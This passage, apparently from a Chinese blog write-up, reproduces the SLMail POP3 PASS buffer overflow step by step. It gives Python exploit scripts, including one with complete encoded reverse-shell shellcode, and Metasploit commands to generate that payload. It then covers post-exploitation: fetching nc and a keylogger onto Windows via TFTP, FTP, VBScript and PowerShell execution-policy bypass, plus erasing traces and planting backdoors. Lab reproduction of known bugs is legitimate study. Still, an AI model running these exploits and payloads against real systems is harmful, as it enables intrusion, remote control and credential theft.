<p><img src="yichu12.png" alt="yichu12"><br><img src="yichu13.png" alt="yichu13"><br><strong>在测试软件中点击ESP寄存器的位置，选择<code>follow in dump</code>选项来查看ESP里面数据的位置。</strong><br><strong>我的测试起始位置是0180A2F8,末尾位置是0180A158，经过16进制的加减之后得到ESP寄存器溢出的数据量为416个，一般一个shellcode需要300个字符左右，现在ESP已经能够满足溢出shellcode的条件了。</strong><br><strong>接下来就是需要修改EIP寄存器使其跳转到ESP，而这时候就需要先向ESP中使其填满我们的shellcode代码。</strong></p>
<h2 id="寻找坏字符"><a href="#寻找坏字符" class="headerlink" title="寻找坏字符"></a>寻找坏字符</h2><p><strong>不同类型的程序，协议，漏洞，会将某些字符认为是坏字符，这些字符有固定用途。</strong></p>
<ul>
<li>返回地址，shellcode,buffer中都不能出现坏字符</li>
<li>null byte (0x00) 空字符，用于终止字符串的拷贝操作</li>
<li>return (0x0D) 回车操作，表示POP3 PASS命令输入完成</li>
</ul>
<p><strong>思路：发送0x00  到    0xff 256 个字符，查找所有的坏字符。</strong><br><strong>07.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = &#123;</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x10&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span>	</span><br><span class="line"><span class="string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span>	</span><br><span class="line"><span class="string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span>	</span><br><span class="line"><span class="string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span>	</span><br><span class="line"><span class="string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span>	</span><br><span class="line"><span class="string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span>	</span><br><span class="line"><span class="string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span>	</span><br><span class="line"><span class="string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span> * <span class="number">2606</span> + <span class="string">&quot;B&quot;</span> * <span class="number">4</span> + badchars</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.4.104&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>重新启动服务，运行脚本，根据上一步的步骤，dump下ESP里面的数据，查看数据，发现<code>0A</code>,<code>0D</code>,<code>00</code>是系统的坏字符，所以shellcode要避免出现这几个字符。</strong></p>
<h2 id="确认ESP的内存地址"><a href="#确认ESP的内存地址" class="headerlink" title="确认ESP的内存地址"></a>确认ESP的内存地址</h2><p><strong>如果使用EIP的值替换为ESP的内存地址，那么溢出发生后就会从EIP跳转到ESP，就会执行设计的shellcode,但是ESP地址变化，硬编码不可行。</strong><br><strong>变通思路</strong></p>
<ul>
<li>在内存中寻找地址固定的系统模块</li>
<li>在模块中寻找 <code>JMP ESP</code> 指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</li>
<li>mona.py 脚本识别内存模块，搜索 <code>return address</code> 是 <code>JMP ESP</code> 指令的模块</li>
<li>寻找无DEP,ALSR保护的内存地址</li>
<li>内存地址不包含坏字符</li>
</ul>
<p><strong>即是在操作系统上寻找一个固定模块，是操作系统自带的模块，并且该模块在内存中是固定分配地址的，这样无论重启多少次，该模块的内存地址都不会变化，这样溢出脚本的效果就有保证。</strong><br><img src="yichu14.png" alt="yichu14"><br><strong>正常运行测试软件，运行完毕后在下面输入<code>!mona modules</code>就能查询系统模块。</strong><br><strong>前提是将mona.py拖放到’PyCommands’文件夹中（在Immunity Debugger应用程序文件夹中）。</strong><br><strong>mona 运行后输出的结果最上面一行注意<code>Rebase</code>,<code>SafeSEH</code>,<code>ASLR</code>,<code>NXCompat</code>,<code>OS Dll</code>五个选项。</strong><br><strong><code>Rebase</code>表示操作系统重启，重启后如果内存地址发生变化内容就是<code>true</code>,否则为<code>false</code>。</strong><br><strong>而剩下的三个选项都表示操作系统提供的安全机制，如果存在这种机制就是<code>true</code>,否则为<code>false</code>。</strong><br><strong>最后一个<code>OS Dll</code>表示是否为操作系统自带的模块，<code>true</code>为系统自带，<code>false</code>则不是系统自带。</strong><br><strong>所以条件筛选后，几个选项必须为四个<code>false</code>一个<code>true</code>，只有这样脚本运行的结果才有保证。</strong><br><img src="yichu15.png" alt="yichu15"><br><img src="yichu16.png" alt="yichu16"><br><strong>执行<code>!mona modules</code>命令后，查找符合条件的系统模块。</strong><br><strong>使用<code>!mona find -s &quot;\xff\xe4&quot; -m system_modle_name</code>来查看该模块是否含有<code>jmp esp</code>。</strong><br><strong>其中 -s 参数后是填写的系统命令的16进制的字符。</strong><br><strong>可以使用kali自带的工具来转换。</strong><br><img src="yichu17.png" alt="yichu17"><br><strong>得到可以跳转ESP的系统的模块的地址后，随便选取一个，来做测试查看，这里选取的是  5f 4b 41 e3。</strong><br><strong>08.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> +<span class="string">&#x27;\x7B\x06\x4C\x5F&#x27;</span> + <span class="string">&#x27;C&#x27;</span> * <span class="number">300</span></span><br><span class="line"><span class="comment"># 内存地址读取翻转，写入时候也是翻转写入，5F 4C 06 7B 写为  7B 06 4C 5F</span></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.0.108&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="yichu18.png" alt="yichu18"><br><strong>执行过后可以看出EIP寄存器已经设定了预定的系统模块跳转ESP的值。</strong></p>
<h2 id="构造shellcode并发送"><a href="#构造shellcode并发送" class="headerlink" title="构造shellcode并发送"></a>构造shellcode并发送</h2><p><strong>kali自带工具生成shellcode。</strong><br><code>cd /usr/share/framework2</code>      脚本所在目录<br><code>./msfpayload -l</code>                     查看所有shellcode的类型<br><code>./msfpayload win32_reverse LHOST=192.168.4.108 LPORT=1234 C</code><br><strong>生成我们需要的shellcode。</strong><br><img src="yichu19.png" alt="yichu19"><br><strong>查看shellcode是否存在坏字符</strong><br><img src="yichu20.png" alt="yichu20"><br><strong>生成的shellcode存在 <code>0d</code> 坏字符。</strong><br><strong>使用该目录下的另一个脚本对已经编码的shellcode再次编码，避免出现坏字符。</strong><br><code>./msfpayload win32_reverse LHOST=192.168.4.108 LPORT=1234 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br><strong><code>R</code>表示原始字符格式，进行再次编码的时候输入必须是原始格式才能够再次编码</strong><br><img src="yichu21.png" alt="yichu21"><br><strong>09.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x77\xea\x7b&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x54\x83\xeb\xfc\xe2\xf4\x8b\x80\x90\x19\x9f\x13\x84\xab\x88\x8a&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf0\x38\x53\xce\xf0\x11\x4b\x61\x07\x51\x0f\xeb\x94\xdf\x38\xf2&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf0\x0b\x57\xeb\x90\x1d\xfc\xde\xf0\x55\x99\xdb\xbb\xcd\xdb\x6e&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xbb\x20\x70\x2b\xb1\x59\x76\x28\x90\xa0\x4c\xbe\x5f\x7c\x02\x0f&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf0\x0b\x53\xeb\x90\x32\xfc\xe6\x30\xdf\x28\xf6\x7a\xbf\x74\xc6&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf0\xdd\x1b\xce\x67\x35\xb4\xdb\xa0\x30\xfc\xa9\x4b\xdf\x37\xe6&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf0\x24\x6b\x47\xf0\x14\x7f\xb4\x13\xda\x39\xe4\x97\x04\x88\x3c&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x1d\x07\x11\x82\x48\x66\x1f\x9d\x08\x66\x28\xbe\x84\x84\x1f\x21&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x96\xa8\x4c\xba\x84\x82\x28\x63\x9e\x32\xf6\x07\x73\x56\x22\x80&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x79\xab\xa7\x82\xa2\x5d\x82\x47\x2c\xab\xa1\xb9\x28\x07\x24\xa9&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x28\x17\x24\x15\xab\x3c\xb7\x42\x7f\x3d\x11\x82\x7f\x86\x11\xb9&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf2\xb5\xe2\x82\x97\xad\xdd\x8a\x2c\xab\xa1\x80\x6b\x05\x22\x15&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xab\x32\x1d\x8e\x1d\x3c\x14\x87\x11\x04\x2e\xc3\xb7\xdd\x90\x80&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x3f\xdd\x95\xdb\xbb\xa7\xdd\x7f\xf2\xa9\x89\xa8\x56\xaa\x35\xc6&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf6\x2e\x4f\x41\xd0\xff\x1f\x98\x85\xe7\x61\x15\x0e\x7c\x88\x3c&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x20\x03\x25\xbb\x2a\x05\x1d\xeb\x2a\x05\x22\xbb\x84\x84\x1f\x47&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xa2\x51\xb9\xb9\x84\x82\x1d\x15\x84\x63\x88\x3a\x13\xb3\x0e\x2c&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x02\xab\x02\xee\x84\x82\x88\x9d\x87\xab\xa7\x82\x8b\xde\x73\xb5&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x28\xab\xa1\x15\xab\x54&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> + <span class="string">&quot;\x7B\x06\x4C\x5F&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">8</span> +  shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.4.108&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="yichu22.png" alt="yichu22"><br><strong>可完美地重复连接，但有些shellcode执行结束会以exitprocess方式退出整个进程，将导致邮件服务奔溃，会引起管理员注意，不过新版本的metasploit已经进行优化。</strong><br><strong>因Slmail是一个基于线程的应用，使用ExitThread方式可以避免整个服务崩溃，可是实现重复溢出。</strong><br><strong>最后编译的shellcode是使被攻击的机器反向连接我们的机器，我们的机器开放端口。究其原因是因为大多数情况下，在被攻击的机器上开放端口，本机连接可能会被防火墙过滤，所以使用反向连接，本机监听端口，使被攻击的机器连接我们的端口，这样比较靠谱。</strong></p>
<h2 id="漏洞利用后阶段"><a href="#漏洞利用后阶段" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h2><ul>
<li>上传工具</li>
<li>提权</li>
<li>擦除攻击痕迹</li>
<li>安装后门<ul>
<li>长期控制</li>
<li>Dump 密码</li>
<li>内网渗透</li>
</ul>
</li>
<li>最大的挑战 ———-&gt; 防病毒软件</li>
<li>使用合法的远程控制软件</li>
</ul>
<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p><strong>目的是持久控制。</strong><br><strong>扩大对目标系统的控制能力。</strong></p>
<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
<h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><p><strong>NC实现的远控是有局限性的，因为生成的是非交互行的shell。</strong><br><strong>使用TFTP传输文件（UDP,无身份验证）</strong></p>
<ul>
<li>xp , 2003 默认安装</li>
<li>win7 , 2008 需要单独添加</li>
<li>经常被边界防火墙过滤</li>
<li>Kali<ul>
<li>mkdir /tftp</li>
<li>cp /usr/share/windows-binaries/klogger.exe /tftp/</li>
<li>cp /usr/share/windows-binaries/whoami.exe /tftp/</li>
<li>cp /usr/share/windows-binaries/nc.exe /tftp/</li>
<li>chown -R nobody /tftp/</li>
<li>atftpd –daemon –port 69 /tftp</li>
</ul>
</li>
<li>Windows<ul>
<li><p>tftp -i attack_ip get hack.exe</p>
</li>
<li><p>接着运行传入的程序就可以了</p>
<p><strong>使用FTP传输文件</strong></p>
</li>
</ul>
</li>
<li>Kali<ul>
<li>apt-get install vsftpd</li>
<li>配置完毕就可以使用了</li>
</ul>
</li>
<li>Windows<ul>
<li><p>echo open ftp_host 21 &gt; ftp.txt</p>
</li>
<li><p>echo ftpname &gt;&gt; ftp.txt</p>
</li>
<li><p>echo ftppass &gt;&gt; ftp.txt</p>
</li>
<li><p>echo cd tools &gt;&gt; ftp.txt</p>
</li>
<li><p>echo GET whoami.exe &gt;&gt; ftp.txt</p>
</li>
<li><p>echo GET nc.exe &gt;&gt; ftp.txt</p>
</li>
<li><p>echo GET klogger.exe &gt;&gt; ftp.txt</p>
</li>
<li><p>echo bye &gt;&gt; ftp.txt</p>
</li>
<li><p>ftp -s:ftp.txt</p>
<p><strong>使用VBSCRIPT传输文件(早期版本的使用)</strong></p>
</li>
</ul>
</li>
<li>wget.vbs</li>
<li>cscript wget.vbs <a target="_blank" rel="noopener" href="http://192.168.3.101/whoami.exe">http://192.168.3.101/whoami.exe</a> whoami.exe</li>
</ul>
<p><strong>Powershell传输文件</strong></p>
<ul>
<li>wget.ps1</li>
<li>powershell.exe -ExecutionPolicy Bypass -NoLogo -Nonlnteractive -NoProfile -File wget.ps1</li>
</ul>
<p><strong>DEBUG传输文件</strong></p>
<ul>
<li>DEBUG<ul>
<li>汇编，反汇编</li>
<li>16进制dump工具</li>
<li>限制传输64k字节</li>
</ul>
</li>
<li>Kali<ul>
<li>upx -9 nc.exe</li>
<li>wine /usr/share/windows-binaries/exe2bat.exe nc.exe /home/wangdada/nc.hex</li>
<li>把nc.hex中的内容传输到windows中</li>
</ul>
</li>
<li>Windows<ul>
<li>debug &lt; nc.hex</li>
<li>copy 1.dll nc.exe</li>
</ul>
</li>
</ul>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul>
<li><strong>linux下可以使用edb-debugger来调试程序。</strong></li>
<li><strong>网络上有一部分网站会公布已经披露的漏洞,可以在上面找自己感兴趣的漏洞来复现。</strong><ul>
<li>选择可信赖的EXP源</li>
<li>Exploit-db    —–&gt;  <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com</a></li>
<li>SecurituFocus —–&gt;  <a target="_blank" rel="noopener" href="https://www.securityfocus.com/">https://www.securityfocus.com/</a></li>
<li>Searchsploit  —–&gt;  kali 自带的命令</li>
</ul>
</li>
</ul>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>王大大</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.stanke.cn/2020/04/15/SLmail%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.stanke.cn/2020/04/15/SLmail%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"># 漏洞复现</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2021/12/22/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%BA%BF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/">从零到亿代码审计（一）</a>
            
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 王大大 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
